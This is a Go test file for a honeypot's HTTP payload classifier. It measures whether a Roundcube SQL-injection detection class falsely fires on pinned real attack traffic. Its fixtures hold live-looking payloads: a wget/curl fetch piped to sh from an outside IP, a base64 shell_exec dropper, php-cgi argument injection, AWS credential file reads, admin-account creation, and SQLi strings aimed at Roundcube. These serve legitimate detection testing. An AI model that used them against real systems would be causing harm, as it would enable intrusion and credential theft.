package main

import (
	"net/url"
	"strings"
	"testing"
)

// The #3364 coverage measurement, as a re-runnable test.
//
// #3364 asked whether the HTTP payload classifier catches CVE-2026-48842's
// shape (pre-auth SQLi in Roundcube's virtuser_query plugin). The answer is
// yes: PR #3420 added the `roundcube-virtuser-query-sqli` class to
// classifyPayload, and it is on main. What #3364 could not do was measure
// the coverage -- the issue itself marks the gap "unmeasured", and the live
// corpus (the fleet's `honeypot-v2-*` indices) is not reachable from a PR
// and is not queried here.
//
// So this file measures against the corpus that IS on main: the pinned
// real-corpus fixture below, mirrored entry-for-entry from
// TestClassifyPayloadOnRealCorpus in payload_test.go, which is itself a
// sample of the fleet's 30-day window (#1888) with the per-entry event
// counts recorded there. Two questions, two counts:
//
//  1. Does the existing classifier claim any of that real traffic as
//     roundcube-virtuser-query-sqli? (It must not: none of it is
//     Roundcube traffic, and a class that fires on ordinary requests is
//     worse than no class.)
//  2. Does the issue's naive, pre-gate signature -- the shape #3364
//     proposed before any scoping -- match anything? (Same answer, and the
//     reason the gate exists: an unscoped signature would also fire on the
//     first SQLi of any other kind that reaches the sensor.)
//
// The third shape #3364 proposed -- a webmail/plugin path segment from a
// source with no prior session in the correlation window -- is not
// implementable in this sensor and is not measured here: the binary keeps
// no session and consults no backend, and #3364's own key insight rules a
// bait path out, because exploitation goes to whatever endpoint the
// target's own dispatch resolves and this fleet serves no webmail UI.
var realCorpusFixture3364 = []struct{ name, query, body string }{
	{"CVE-2017-9841 PHPUnit eval-stdin", "", `<?php echo(md5("Hello PHPUnit"));`},
	{"base64 shell_exec dropper", "", `<?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTs="));`},
	{"wget-or-curl piped to sh", "", `(wget --no-check-certificate -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s apache`},
	{"php-cgi argument injection, %AD form", `%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`, ""},
	{"php-cgi argument injection, double-encoded", `%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`, ""},
	{"php-cgi argument injection, plain", `-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input`, ""},
	{"ThinkPHP invokefunction", `s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello`, ""},
	{"pearcmd config-create", `lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"))&?>+/tmp/index1.php`, ""},
	{"bare traversal", `lang=../../../../../../../../tmp/index1`, ""},
	{"cat of AWS credentials through cmd=", `cmd=cat%20/root/.aws/credentials`, ""},
	{"credential file read by path", `file=/root/.aws/credentials`, ""},
	{"administrator account creation", "", `{"Name": "lan test", "Description": "lan test", "Enabled": true, "Password": "+Y{BI~\"&|qp8", "RoleId": "Administrator", "Locked": false}`},
	{"SOAP ONVIF probe", "", `<?xml version="1.0" encoding="UTF-8"?><env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">`},
	{"androxgh0st marker", `0x%5B%5D=androxgh0st`, ""},
	{"WordPress REST enumeration", `rest_route=/gravitysmtp/v1/tests/mock-data&page=gravitysmtp-settings`, ""},
	{"prototype pollution through multipart", "", "------WebKitFormBoundary2906f9affd539b16\nContent-Disposition: form-data; name=\"0\"\n\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\"}"},
	{"multipart padding", "", "------WebKitFormBoundary0l0DxKbGCnFnLnh9uOlWuP6x\nContent-Disposition: form-data; name=\"junk\"\n\n" + strings.Repeat("A", 200)},
	{"batch multiplexer probe, empty", "", `{"requests":[]}`},
	{"batch multiplexer probe, populated", "", `{"requests":[{"method":"POST","path":"http:///x"},{"method":"GET","path":"/wp/v2/posts"}]}`},
	{"version.bind at an HTTP port", `version.bind`, ""},
	{"bare hostname as the whole query", `ip.parrotdns.com`, ""},
	{"MCP handshake", "", `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{}}}`},
	{"mining RPC probe", "", `{"id": 1, "method": "eth_getWork", "params": []}`},
	{"VPN handshake at a web port", "", `<config-auth client="vpn" type="init" aggregate-auth-version="2">`},
	{"binary protocol that is still valid UTF-8", "", "\x00\x00\x00\x00\x03:\x01*"},
	{"nothing at all", "", ""},
	{"ordinary query", `format=json`, ""},
}

// naiveSignature3364 is #3364's proposed detection shape with the Roundcube
// gate removed -- the signature as first drafted in the issue, before any
// scoping: (a) a backslash immediately before a quote in any body or query
// value, (b) stacked or union-style SQL tokens in a body value on a
// non-GET request. Shape (c) of the issue (path segment plus no prior
// session) is not implementable here; see the file comment.
func naiveSignature3364(query, body, method string) bool {
	for _, raw := range []string{query, body} {
		values, err := url.ParseQuery(raw)
		if err != nil {
			continue
		}
		for _, vals := range values {
			for _, v := range vals {
				if strings.Contains(v, `\'`) {
					return true
				}
			}
		}
	}
	if method == "GET" {
		return false
	}
	b := strings.ToLower(body)
	return containsAny(b, "union select", "union all select", "or 1=1", "' or '",
		"';", "'--", "sleep(", "benchmark(", "waitfor delay", "information_schema",
		"extractvalue(", "updatexml(", "pg_sleep(", "; select", ";drop", "; update")
}

// TestRoundcube3364CorpusMeasurement is the measurement #3364 asked for,
// run against the only corpus reachable from the repo. It prints the
// label histogram and the two counts, and asserts the load-bearing ones:
// neither the existing class nor the naive signature claims any of the
// pinned real traffic. If a future corpus sample adds a Roundcube-shaped
// entry, the assertion fails and the count has to be re-derived rather
// than assumed -- that is the point of pinning it.
func TestRoundcube3364CorpusMeasurement(t *testing.T) {
	hist := map[string]int{}
	var naiveHits, roundcubeHits []string
	for _, f := range realCorpusFixture3364 {
		if got := classifyPayload(f.query, f.body); got == "roundcube-virtuser-query-sqli" {
			roundcubeHits = append(roundcubeHits, f.name)
		} else {
			hist[got]++
		}
		// The fixture entries are bodies, i.e. POST-shaped traffic.
		if naiveSignature3364(f.query, f.body, "POST") {
			naiveHits = append(naiveHits, f.name)
		}
	}

	t.Logf("existing classifier over the %d-entry pinned real-corpus fixture:", len(realCorpusFixture3364))
	for label, n := range hist {
		t.Logf("  %-28s %d", label, n)
	}
	t.Logf("roundcube-virtuser-query-sqli claims: %d %v", len(roundcubeHits), roundcubeHits)
	t.Logf("naive pre-gate signature matches:  %d %v", len(naiveHits), naiveHits)

	if len(roundcubeHits) != 0 {
		t.Errorf("the Roundcube class claims %d pinned real-corpus entries: %v", len(roundcubeHits), roundcubeHits)
	}
	if len(naiveHits) != 0 {
		t.Errorf("the naive signature matches %d pinned real-corpus entries: %v", len(naiveHits), naiveHits)
	}

	// The other half of the measurement: the naive signature is not short
	// of matches in general -- it matches the CVE's own published shape
	// every time, which is exactly why it needed the gate. Counted over
	// the nine published shapes pinned in roundcube_sqli_test.go.
	published := []struct{ query, body string }{
		{"", "_token=f3a9c1d2b8e7&_task=login&_action=login&_timezone=Europe%2FBerlin&_url=&_user=admin%5C%27+or+1%3D1--&_pass=Summer2026"},
		{"", "_token=f3a9c1d2b8e7&_task=login&_action=login&_user=%5C%27+union+select+1%2C2%2C3%2C4%2C5--"},
		{"", "_task=login&_action=login&_user=%5C%27+or+sleep(5)--"},
		{"", "_task=login&_action=login&_user=%5C%27+or+extractvalue(1%2Cconcat(0x7e%2Cversion()))--"},
		{"", "_task=login&_action=login&_user=%27+union+select+username%2Cpassword+from+information_schema.tables--"},
		{"", "_task=login&_action=login&_user=admin%27%3B+drop+table+users--"},
		{"_task=mail&_action=plugin.virtuser_query&_u=%5C%27+union+select+1%2C2%2C3--", ""},
		{"_action=virtuser_query&_u=admin%5C%27+or+1%3D1--", ""},
		{"virtuser_query=admin%5C%27+or+1%3D1--", ""},
	}
	naiveOnPublished, classified := 0, 0
	for _, p := range published {
		if naiveSignature3364(p.query, p.body, "POST") {
			naiveOnPublished++
		}
		if classifyPayload(p.query, p.body) == "roundcube-virtuser-query-sqli" {
			classified++
		}
	}
	t.Logf("naive signature over the 9 published shapes: %d/9; existing class: %d/9", naiveOnPublished, classified)
	if classified != len(published) {
		t.Errorf("the existing class catches %d/%d published shapes, want all of them", classified, len(published))
	}
}
